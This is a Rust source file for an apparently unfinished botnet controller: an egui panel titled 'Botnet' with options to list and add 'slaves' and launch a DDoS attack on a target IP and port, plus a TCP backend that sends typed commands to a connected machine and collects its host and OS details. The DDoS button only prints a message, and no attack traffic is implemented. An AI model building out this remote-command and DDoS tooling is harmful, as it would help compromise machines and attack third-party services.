use regex::Regex;
//
static mut test : bool = false;
static mut frame_selected : &str = "default";
//

fn is_a_valid_ip(ip: &str) -> bool {
    let re = Regex::new(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{1,5}$").unwrap();
    re.is_match(ip)
}

/// We derive Deserialize/Serialize so we can persist app state on shutdown.
#[derive(serde::Deserialize, serde::Serialize)]
#[serde(default)] // if we add new fields, give them default values when deserializing old state
pub struct TemplateApp {
    // Example stuff:
    label: String,
    ip_new_slave: String,
    ip_target: String,

    // this how you opt-out of serialization of a member
    #[serde(skip)]
    value: f32,
}

impl Default for TemplateApp {
    fn default() -> Self {
        Self {
            // Example stuff:
            label: "Hello World!".to_owned(),
            ip_target: "127.0.0.1:8080".to_owned(),
            ip_new_slave: "137.194.33.11".to_owned(),
            value: 2.7, 
        }
    }
}

impl TemplateApp {
    /// Called once before the first frame.
    pub fn new(cc: &eframe::CreationContext<'_>) -> Self {
        // This is also where you can customize the look and feel of egui using
        // `cc.egui_ctx.set_visuals` and `cc.egui_ctx.set_fonts`.

        // Load previous app state (if any).
        // Note that you must enable the `persistence` feature for this to work.
        if let Some(storage) = cc.storage {
            return eframe::get_value(storage, eframe::APP_KEY).unwrap_or_default();
        }

        Default::default()
    }
}

impl eframe::App for TemplateApp {
    /// Called by the frame work to save state before shutdown.
    fn save(&mut self, storage: &mut dyn eframe::Storage) {
        eframe::set_value(storage, eframe::APP_KEY, self);
    }

    /// Called each time the UI needs repainting, which may be many times per second.
    /// Put your widgets into a `SidePanel`, `TopPanel`, `CentralPanel`, `Window` or `Area`.
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        let Self { label, value, ip_new_slave, ip_target } = self;

        // Examples of how to create different panels and windows.
        // Pick whichever suits you.
        // Tip: a good default choice is to just keep the `CentralPanel`.
        // For inspiration and more examples, go to https://emilk.github.io/egui

        #[cfg(not(target_arch = "wasm32"))] // no File->Quit on web pages!
        egui::TopBottomPanel::top("top_panel").show(ctx, |ui| {
            // The top panel is often a good place for a menu bar:
            egui::menu::bar(ui, |ui| {
                ui.menu_button("File", |ui| {
                    if ui.button("Quit").clicked() {
                        _frame.close();
                    }
                });
            });
        });

        egui::SidePanel::left("side_panel").show(ctx, |ui| {
            ui.heading("Botnet");

            /*
            ui.horizontal(|ui| {
                ui.label("Write something: ");
                ui.text_edit_singleline(label);
            });
            */

            //ui.add(egui::Slider::new(value, 0.0..=10.0).text("value"));
            if ui.button("show slaves").clicked() {
                //*value += 1.0;
                unsafe{
                    test = !test;
                    frame_selected = "slaves_list";
                };
            }

            if ui.button("add slave").clicked() {
                //*value += 1.0;
                unsafe{
                    test = !test;
                    frame_selected = "slaves_add";
                };
            }

            if ui.button("launch an attack").clicked() {
                //*value += 1.0;
                unsafe{
                    test = !test;
                    frame_selected = "attack_launch";
                };
            }


            ui.with_layout(egui::Layout::bottom_up(egui::Align::Center), |ui| {
                /*
                ui.horizontal(|ui| {
                    ui.spacing_mut().item_spacing.x = 0.0;
                    ui.label("powered by ");
                    ui.hyperlink_to("egui", "https://github.com/emilk/egui");
                    ui.label(" and ");
                    ui.hyperlink_to(
                        "eframe",
                        "https://github.com/emilk/egui/tree/master/crates/eframe",
                    );
                    ui.label(".");
                });
                */
            });
        });

        egui::CentralPanel::default().show(ctx, |ui| {
            // The central panel the region left after adding TopPanel's and SidePanel's

            unsafe{
                match frame_selected{
                    "slaves_list" =>{
                        ui.heading("Show current slaves");
                        //ui.hyperlink("https://github.com/emilk/eframe_template");
                        ui.add(egui::github_link_file!(
                            "https://github.com/emilk/eframe_template/blob/master/",
                            "127.0.0.1:8080 - connected"
                        ));
                    },
                    "slaves_add" =>{
                        ui.heading("Add a new slave");
                        ui.horizontal(|ui| {
                            ui.label("IP address (IP:PORT): ");
                            ui.text_edit_singleline(ip_new_slave);
                        });

                        if ui.button("add slave").clicked(){
                            if is_a_valid_ip(ip_new_slave){
                                println!("Adding slave {}", ip_new_slave);
                            }
                            else{
                                println!("Invalid IP address");
                            }
                        };
                    },
                    "attack_launch" =>{
                        ui.heading("Launch a DDoS attack");
                        ui.horizontal(|ui| {
                            ui.label("Target (IP:PORT): ");
                            ui.text_edit_singleline(ip_target);
                        });
                        
                        if ui.button("Launch attack").clicked(){
                            if is_a_valid_ip(ip_target){
                                println!("Launching attack on {}", ip_target);
                            }
                            else{
                                println!("Invalid IP address");
                            }
                        };
                    },
                    _ =>{
                        ui.heading("eframe DEFAULT");
                        //ui.hyperlink("https://github.com/emilk/eframe_template");
                        ui.add(egui::github_link_file!(
                            "https://github.com/emilk/eframe_template/blob/master/",
                            "127.0.0.1:8080 - connected"
                        ));
                    }
                }
            };
            //egui::warn_if_debug_build(ui);
        });

        if false {
            egui::Window::new("Window").show(ctx, |ui| {
                ui.label("Windows can be moved by dragging them.");
                ui.label("They are automatically sized based on contents.");
                ui.label("You can turn on resizing and scrolling if you like.");
                ui.label("You would normally choose either panels OR windows.");
            });
        }
    }
}

/********************************BACKEND***********************************/


use std::{net::TcpStream, io::{Write, Read, self}, fs::{self, File, OpenOptions}, ops::Add, os::windows::prelude::AsSocket, time::Duration};//, error::Error};
use easyinput::input;
use std::thread;
use serde::{Serialize, Deserialize, de::Error};
use std::net::Ipv4Addr;
use sysinfo::{NetworkExt, ProcessExt, System, SystemExt};

use std::env;

mod SystemInfo;

//mod SystemInfo;

static mut counter_disonnectuon: u128 = 0;
static mut retry: bool = false;
static mut command__: String = String::new();

fn connect_to_slave(socket: &str){
    let mut is_connected = false;

    let mut isGood = true;
    let mut command_ = String::from("");

    while !is_connected {
        match TcpStream::connect("127.0.0.1:8080"){
            Ok(stream) => {
                println!("ok");
                is_connected = true;
                print!("Enfin !");

                let stream_read = stream.try_clone().unwrap();
                let mut stream_write = stream.try_clone().unwrap();

                println!("c'est executé pourtant");
                handle_connection(&mut stream_write, String::from("00001").add(":"));

                //let vec_id = read_vec_from_file("./src/uuid.txt");

                
                unsafe{
                    let mut retry_cln : bool = retry.clone();
                    let handle_write = thread::spawn(move ||{
                        let mut stream_write = stream_write.try_clone().unwrap();
                        unsafe{
                            println!("eeooo : {}", retry_cln);
                            if retry_cln==true{
                                println!("j'ai retry!!!");
                                handle_connection(&mut stream_write, command__.clone());
                                retry_cln = false;
                            };
                        }
                        loop{
                            let command: String = input("command: ");
                            let isGood = handle_connection(&mut stream_write, command.clone());
                            if !isGood{
                                println!("erreur bro, string = {}", command);
                                return (true, command);
                                //handle_connection(&mut stream_write, command.clone());
                            }
                        }
                    });

                    let value_returned_by_thread_write = handle_write.join().unwrap();
                    if value_returned_by_thread_write.0==true{
                        unsafe{
                            retry = true;
                            command__ = value_returned_by_thread_write.1.clone();
                            println!("command__ = {}", command__.clone().as_str());
                        };
                        connect_to_slave("127.0.0.1:8080");
                        //return;
                    }

                };

                let handle_read = thread::spawn(move ||{
                    let stream_read = stream_read.try_clone().unwrap();
                    read(&stream_read);
                });
                
                _ = handle_read.join();
            },
            Err(error) => {
                println!("nouvelle tentative");
                continue
            },
        };
    }
}

fn write_string_to_file(string: &str, path: &str) {
    // Open the file at the specified path with append mode
    let mut file = match OpenOptions::new().append(true).open(path) {
        Ok(file) => file,
        Err(err) => panic!("Error opening file: {}", err),
    };

    // Write the `String` to the file 
    match file.write_all((String::from("\n").add(string)).as_bytes()) {
        Ok(_) => (),
        Err(err) => panic!("Error writing to file: {}", err),
    };
}

fn read_string_from_file(path: &str) -> Result<String, std::io::Error> {
    // Open the file at the specified path
    let mut file = File::open(path)?;

    // Read the file contents into a string
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;

    Ok(contents)
}


//use youchoose;

/*
fn main() {
    let mut menu = youchoose::Menu::new(0..100);
    let choice = menu.show();
    // `choice` is a Vec<usize> containing the chosen indices
    println!("Index of the chosen item: {:?}", choice);
}
*/

//use youchoose;

/*
fn main(){
    let mut menu = youchoose::Menu::new(0..100).preview(multiples);
    let choice = menu.show();
    println!("Chose {:?}", choice);
    
}
*/

fn multiples(num: i32) -> String {
    let mut buffer = String::new();
    for i in 0..20 {
        buffer.push_str(
            &format!("{} times {} is equal to {}!\n", num, i, num * i)
        );
    }
    buffer
}


/*
fn main() {
    
    //show slaves definition
    let mut number_of_connected_slaves : i32 = 0;
    let mut number_of_disconnected_slaves : i32 = 0;
    let mut show_slaves : Vec<TerminalMenuItem> = Vec::new();
    let res = read_string_from_file("./src/slaves.txt").unwrap();
    for line in res.lines() {
        let mut state : &str;
        match TcpStream::connect(line.clone()){
            Ok(_) =>{
                number_of_connected_slaves += 1;
                state = "connected";
            },
            Err(_) => {
                number_of_disconnected_slaves += 1;
                state = "disconnected";
            },
        };
        
        let to_show = format!("{}{}{}", line.clone(), " - ", state.clone());
        show_slaves.push(label(to_show));
        break;
    }
    show_slaves.push(back_button("Back"));

    let mut add_new_slave : Vec<TerminalMenuItem> = Vec::new();

    /*
    let menu = menu(vec![
        submenu("show slaves", show_slaves),
        //submenu("refresh", add_new_slave),
        //submenu("launch a DDOS attack", launch_ddos_attack),
        back_button("Exit")
    ]);
    run(&menu);
    */

    let show_slaves = || {
        let mut vec_menu : Vec<MenuOption> = Vec::new();
        //show slaves definition
        let mut number_of_connected_slaves : i32 = 0;
        let mut number_of_disconnected_slaves : i32 = 0;
        //let mut show_slaves : Vec<TerminalMenuItem> = Vec::new();
        let res = read_string_from_file("./src/slaves.txt").unwrap();
        for line in res.lines() {
            let mut state : &str;
            match TcpStream::connect(line.clone()){
                Ok(_) =>{
                    number_of_connected_slaves += 1;
                    state = "connected";
                },
                Err(_) => {
                    number_of_disconnected_slaves += 1;
                    state = "disconnected";
                },
            };
            
            let to_show = format!("{}", line.clone());
            println!("{}", to_show);
            vec_menu.push(MenuOption::new(&to_show, ||{}).hint(state.clone()));
            //show_slaves.push(label(to_show));
            //break;
        }

        vec_menu.push(MenuOption::new("Exit", || {
            return;
        }));

        //set the new menu
        let menu = Menu::new(vec_menu);
        menu.show();
    };

    let menu = Menu::new(vec![
        MenuOption::new("show slaves", show_slaves),
        MenuOption::new("Exit", || {
            return;
        }),
    ]);

    menu.show();

    //connect_to_slave("127.0.0.1:8080");

}
*/

struct Slave{
    id : i64,
    port : String,
    IP : Ipv4Addr,
}

fn handle_connection(connection: &mut TcpStream, message: String) -> bool{
    let mut isGood = false;

    match connection.write(&message.bytes().collect::<Vec<u8>>()){
        Ok(_s) =>{
            isGood = true;
            //break;
        },
        Err(_e)=>{
            //We try to reconnect
            //connect_to_slave(connection.peer_addr().unwrap().to_string().as_str());  
            isGood = false; 
            println!("{:?}", _e);
            //connection.write(&message.bytes().collect::<Vec<u8>>()).unwrap();     
        }
    };
    

    
    /*
    while !isGood{
        match connection.write(&message.bytes().collect::<Vec<u8>>()){
            Ok(_s) =>{
                isGood = true;
                //break;
            },
            Err(_e)=>{
                //We try to reconnect
                //connect_to_slave(connection.peer_addr().unwrap().to_string().as_str());  
                isGood = false; 
                println!("{:?}", _e);
                //connection.write(&message.bytes().collect::<Vec<u8>>()).unwrap();     
            }
        };
    }
    */
    

    //connection.write(&message.bytes().collect::<Vec<u8>>()).unwrap();
    let _splitted_tab = message.split(":").collect::<Vec<&str>>();

    /*
    if *splitted_tab.get(0).unwrap()=="00003"{
        println!("reading");
        let stream_read = connection.try_clone().unwrap();
        let system_infos = read_system_infos(&stream_read);
        println!("finished reading");
        println!("info received : {:?}", system_infos);
    }
    */

    /*
    match connection.write(&message.bytes().collect::<Vec<u8>>()){
        Ok(_l) =>{
        },
        Err(_e) =>{
            //We have to reconnect
            connect_to_slave("127.0.0.1:8080");
        }
    }
    */
    return isGood;
}

//To delete, will be unused
fn read(stream : &TcpStream){
    let mut stream = stream.try_clone().unwrap();
        loop{
            let mut buffer = [0u8; 1024];
            //let len = stream.read(&mut buffer).unwrap();
            let mut len = 0;
            len = match stream.read(&mut buffer){
                Ok(l) =>{
                    l
                },
                Err(e) =>{
                    //We have to reconnect
                    connect_to_slave("127.0.0.1:8080");
                    break;
                }
            };

            if len > 0 {
                let message = String::from_utf8_lossy(&buffer[..len]);
                //println!("\nReceived: {} ", message);
            }
        }
}

fn read_system_infos(stream : &TcpStream) -> [u8; 16]{
    let mut stream = stream.try_clone().unwrap();
    let mut buffer = [0u8; 16];
    loop{
        buffer = [0u8; 16];
        println!("waiting bro");
        println!("stream client side : {:?}", stream.peer_addr());
        let len = stream.read(&mut buffer).unwrap();
        println!("received bro");
        if len > 0 {
            break;
        }else{
            panic!("an error has occured while trying to save the uuid");
        }
    }
    return buffer;
}

/*
fn read_uuid(stream : &TcpStream) -> Uuid{
    let mut stream = stream.try_clone().unwrap();
        loop{
            let mut buffer = [0u8; 16];
            let len = stream.read(&mut buffer).unwrap();
            if len > 0 {
                let uuid = Uuid::from_bytes(buffer);
                println!("\nReceived: {} ", uuid);
                return uuid;
            }else{
                panic!("an error has occured while trying to save the uuid");
            }
        }
}
*/

/*
fn read_vec_from_file(filename: &str) -> Vec<Uuid>{

    let mut vec_uuid : Vec<Uuid> = Vec::new();
    // Read the contents of the file as a string
    let mut file = fs::File::open(filename)
        .expect("Failed to open file");
    let mut contents = String::new();
    file.read_to_string(&mut contents)
        .expect("Failed to read file");

    for s in contents.split(",") {
        // Check if the string slice can be parsed as a Uuid value
        if let Ok(uuid) = Uuid::parse_str(s) {
            // If it can, push the Uuid value onto the vec_uuid vector
            vec_uuid.push(uuid);
        }
    }

    // Print the resulting vector
    println!("{:?}", vec_uuid);
    vec_uuid
}
*/

// Define a function that takes a `Vec<i64>` and a file path as arguments
/*
fn write_vec_to_file(vec: Vec<Uuid>, path: &str) {
    // Open the file at the specified path
    let mut file = match File::create(path) {
        Ok(file) => file,
        Err(err) => panic!("Error creating file: {}", err),
    };

    // Convert the `Vec<i64>` to a `String`
    let vec_string = vec.iter()
        .map(|n| n.to_string())
        .collect::<Vec<String>>()
        .join(",");

    // Write the `String` to the file
    match file.write_all(vec_string.as_bytes()) {
        Ok(_) => (),
        Err(err) => panic!("Error writing to file: {}", err),
    };
}
*/
fn get_system_informations() -> SystemInfo::SystemInfo{
    let mut sys = System::new_all();

    // First we update all information of our `System` struct.
    sys.refresh_all();

    let mut system_info_b = String::new();
    // Display system information:
    system_info_b.push_str(&format!("££System name: {};£", sys.name().unwrap().replace("//","£")));
    system_info_b.push_str(&format!("System kernel version: {};£", sys.kernel_version().unwrap().replace("//","£")));
    system_info_b.push_str(&format!("System OS version: {};£", sys.os_version().unwrap().replace("//","£")));
    system_info_b.push_str(&format!("System host name: {};££", sys.host_name().unwrap().replace("//","£")));

    /******/
    //println!("1) -> {}", String::from(system_info_b.clone()));
    /******/
    
    SystemInfo::SystemInfo {
        systemInfo : String::from(system_info_b),
    }
}

//this function create a CLI menu who allows to choose an option, to execute a command, to do previous or to quit
//without using any library





